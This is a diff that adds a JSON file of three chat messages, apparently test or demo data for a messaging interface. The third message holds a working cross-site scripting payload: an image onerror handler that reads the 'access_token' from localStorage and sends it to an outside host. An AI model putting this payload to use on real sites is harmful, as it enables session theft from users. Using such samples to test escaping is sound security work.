@@ -1,0 +1,13 @@
+[
+    {
+        "id": "1",
+        "message": "Hello"
+    },{
+        "id": "2",
+        "message": "How are you?"
+    },
+    {
+        "id": "3",
+        "message": "<img src='bac.jpg' onerror=\"function hacked(img) { img.src='http://server.com?hackeddata='+(localStorage.getItem('access_token')) }; hacked(this)\">"
+    }
+]
